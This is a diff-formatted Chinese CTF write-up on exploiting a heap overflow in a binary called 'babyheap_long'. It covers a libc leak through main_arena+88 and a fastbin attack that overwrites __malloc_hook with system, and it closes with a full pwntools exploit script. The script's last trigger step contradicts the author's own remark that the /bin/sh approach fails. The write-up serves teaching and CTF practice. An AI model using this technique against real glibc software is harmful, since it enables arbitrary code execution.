@@ -1,0 +1,168 @@
+我们看一个正常的拥有两个元素的unsorted bin的结构
+这个头部chunk的bk指针就是指向的是
+     bck->fd = unsorted_chunks (av);
+`unsorted_chunks(av)`这个地址到底是哪里
+    #define unsorted_chunks(M)          (bin_at (M, 1))
+    #define bin_at(m, i) \
+      (mbinptr) (((char *) &((m)->bins[((i) - 1) * 2]))                  \
+                 - offsetof (struct malloc_chunk, fd))
+av就是main_arena，我们把1代入bin_at得到unsorted_chunks(av)的地址为main_arena->bins – chunk
+header的大小就是main_arena->top的地址
+    struct malloc_state
+    {
+      /* Serialize access.  */
+      mutex_t mutex;
+      /* Flags (formerly in max_fast).  */
+      int flags;
+      /* Fastbins */
+      mfastbinptr fastbinsY[NFASTBINS];
+      /* Base of the topmost chunk -- not otherwise kept in a bin */
+      mchunkptr top;
+      /* The remainder from the most recent split of a small request */
+      mchunkptr last_remainder;
+      /* Normal bins packed as described above */
+      mchunkptr bins[NBINS * 2 - 2];
+      ...
+      static struct malloc_state main_arena =
+    {
+      .mutex = _LIBC_LOCK_INITIALIZER,
+      .next = &main_arena,
+      .attached_threads = 1
+    };
+这段代码是在malloc.c文件中中定义的，编译后main_arena就是保存了unsorted bin链表，我们计算一下mchunkptr
+bins[NBINS * 2 – 2];这个数组相对malloc_state结构的偏移。  
+首先要确定 mfastbinptr fastbinsY[NFASTBINS];这个长度是多少，要确定NFASTBINS的大小
+    #define NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)
+    #define MAX_FAST_SIZE     (80 * SIZE_SZ / 4)
+    #define fastbin_index(sz) \
+      ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
+64位下，SIZE_SZ的值为8， MAX_FAST_SIZE为160，代入request2size（160）得到176，
+进一步代入fastbin_index得到NFASTBINS为10  
+32位下， SIZE_SZ的值为4， MAX_FAST_SIZE为80， 代入request2size（80） 得到88，
+进一步代入fastbin_index得到NFASTBINS为10
+所以无论在32位还是64位下， NFASTBINS均为10，就是都是有10个mfastbinptr指针，那么总大小就是10*8 = 80  
+进而得到main_arena->top的偏移为 4 + 4 + 80 = 88=0x58, 在ida的local中定义新的数据结构看下偏移也是0x58
+与我们计算的吻合，所以理论上头部chunk的bk指针指向的地址就是main_arena + 88字节的值
+为了泄露main_arena + 88这个值，我们首先需要溢出chunk1，使其修改chunk2的prev size和size字段
+chunk2的prev size从0x80改为0x180，size从0x101改为0x100，这样可以将chunk1标识为空闲块。  
+然后再free chunk2，触发错误的后向融合，chunk1连同chunk0和chunk2一起被当做一个大的chunk放到unsorted bin上。
+在gdb中观察unsorted bin的情况
+可以看到，如我们的预期，unsroted bin中有一个chunk,大小是0x280。
+当我们malloc 0xf0之后，会分割这个0x280的chunk，剩下0x180大小的chunk，并且重写unsorted
+bin的fd和bk以及新的头部chunk的fd bk指针
+这个新的unsorted bin链表头部chunk实际上就是我们的的chunk1，而chunk1是可以被我们打印的，因为他没有被我们人为的free。  
+因此我们可以通过打印chunk1的数据部分泄露他的bk和fd指针内容，由于unsorted
+bin上只有一个元素，所以bk与fd相等都是指向main_arena+88偏移的地址。  
+我们利用逻辑打印这个chunk1的内容
+    >>> leak_address = res.split('\n')[1][0:8]
+    >>> hex(u(leak_address))
+    '0x7ffff7fc2b78'
+main_arena = 0x7ffff7fc2b78 – 88 = 0x7ffff7fc2b20  
+我们利用GEF的heap arenas看一下是否相同
+    gef➤  heap arenas                                                                                     
+    Arena (base=0x7ffff7fc2b20, top=0x5555557572c0, last_remainder=0x555555757100, next=0x7ffff7fc2b20, ne
+    xt_free=0x0, system_mem=0x21000)
+所以我们已经成功泄露了main_arena+88的地址。我们可以基于此得到任意想要的libc偏移地址。
+## 劫持控制流
+由于这个二进制开启了PIE，因此不能通过改写GOT的方式实现控制流劫持。但是我们可以通过改写__malloc_hook这个指针的方式实现控制流劫持。如果
+malloc_hook 和free_hook的值存在，则会调用malloc_hook或者free_hook指向的地址。
+###  修改__malloc_hook指针
+__malloc_hook在内存中的偏移为mian_arena – 0x10 ，64位情况下。 我们使用fastbin attack实现对这个地址的控制。
+###  fastbin attack原理
+  1. 同一个fastbin 链表上有2个空闲的chunk，
+    Fastbins[idx=1, size=0x30]  ←  Chunk(addr=0x555555757140, size=0x30, flags=PREV_INUSE)  ←  Chunk
+    (addr=0x7ffff7fc2b20, size=0x0, flags=) [incorrect fastbin_index]
+    `
+我们虽然能够修改fd指针，让他指向一个虚假的chunk，但是由于fast
+bin内部还是有一个size的检查，会去看这个假chunk的size字段是否就是符合0x30，如果不符合就会报错。所以要想办法让这个size符合我们的fastbin的要求。我们仔细观察malloc_chunk临近内存的值情况
+    gef➤  x/gx 0x7ffff7fc2b10
+    0x7ffff7fc2b10 : 0x0000000000000000
+    gef➤  x/gx 0x7ffff7fc2b10 -8
+    0x7ffff7fc2b08 :        0x00007ffff7c83a00
+我们通过将这个假的chunk的size指向一个0x7ffff7fc2b08 +5这个地址，这个地方存放值是
+    gef➤  x/gx 0x7ffff7fc2b08 +5
+    0x7ffff7fc2b0d :      0x000000000000007f
+这个值是可以通过长度检测的
+     if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
+                {
+                  errstr = "malloc(): memory corruption (fast)";
+                errout:
+                 malloc_printerr (check_action, errstr, chunk2mem (victim), av);
+                  return NULL;
+                ...
+fastbin_index(0x7f)的返回值为5，因此我们只需要在fastbin chunk index为5的链表上面构建就行了，5所对应的fast
+bin chunk的大小为0x70.
+那么这个假chunk的地址就是0x7ffff7fc2b08 + 5 – 8 = 0x7ffff7fc2b05
+通过连续malloc(0x60)两次，然后释放第二个malloc的chunk，得到下面的内存布局
+我们通过溢出ck0，覆盖ck1的fd指针，
+0x7ffff7fc2af5 – 8 = 0x7ffff7fc2aed  
+0x7ffff7fc2af5: 0x000000000000007f
+    Fastbins[idx=5, size=0x70]  ←  Chunk(addr=0x555555757180, size=0x70, flags=)  ←  Chunk(addr=0x7ffff7fc2afd, 
+    size=0x78, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)  ←  [Corrupted chunk at 0xfff7c83e20000010]
+现在我们把假的chunk添加到了fast bin上了，并且我们把size修正好了，使他能够绕过检测。  
+我们现在连续malloc(0x60)两次就可以得到一个指向 0x7ffff7fc2aed+16 =
+0x7ffff7fc2afd的指针，通过0x7ffff7fc2afd覆盖0x7ffff7fc2b10(__malloc_hook).
+我们覆盖的值可以为system函数的地址，通过main_arena泄露的地址，先确定system函数地址为`0x7ffff7c43390`
+观察内存值可以发现, 我们已经成功修改了_malloc_hook的值
+    gef➤  x/gx &__malloc_hook
+    0x7ffff7fc2b10 : 0x00007ffff7c43390
+我们再确定/bin/sh字符串的地址，进而在调用malloc的时候，直接将这个参数传进去就行了  
+确定/bin/sh的地址为`0x7ffff7d8ad57`  
+但是后来发现这个二进制对长度是有限制的，只截取8个字符，所以我们不能用这种办法。
+那就只能在二进制中直接找execve(‘/bin/sh’)的地方了，然后把这个地址写到我们的__malloc_hook中就行了
+我的exp到
+    from pwn import *
+    target = process("./babyheap_long", env={"LD_PRELOAD":"./libc.so.6"})
+    elf = ELF("babyheap_long")
+    libc = ELF("./libc.so.6")
+    recv_str = target.recv()
+    print recv_str
+    # I/O Functions
+    def allocate(size):
+      target.sendline("1")
+      target.sendline(str(size))
+      print target.recv()
+    def write_data(index, size, data):
+      target.sendline("2")
+      target.sendline(str(index))
+      target.sendline(str(size))
+      target.send(data)
+      print target.recv()
+    def remove(index):
+      target.sendline("3")
+      target.sendline(str(index))
+      print target.recv()
+    def view(index):
+      target.sendline("4")
+      target.sendline(str(index))
+      #print "pillar"
+      leak = target.recv()
+      return leak
+    allocate(0xf0)
+    allocate(0x70)
+    allocate(0xf0)
+    allocate(0x30)
+    remove(0)
+    remove(1)
+    allocate(0x70)
+    write_data(0,0x80,'A'*0x70 + p64(0x180) + p64(0x100))
+    remove(2)
+    allocate(0xf0)
+    u = make_unpacker(64, endian='little', sign='unsigned')
+    res = view(0)
+    leak_address = res.split('\n')[1][0:8]
+    print(hex(u(leak_address)))
+    allocate(0x60)
+    allocate(0x60)  
+    remove(4)   ## make heap layout
+    write_data(2,0x78,'A'*0x68 + p64(0x70) + p64(0x7ffff7fc2aed))
+    allocate(0x60)
+    allocate(0x60)  ## get the ptr to control malloc_hook
+    system_addr = 0x7ffff7c43390
+    write_data(5,19 + 8,'A'*19 + p64(system_addr))
+    allocate(0x7ffff7d8ad57) # trigger system
+## 参考
+  1. 
+  2. 
+  3. 
+  4. 
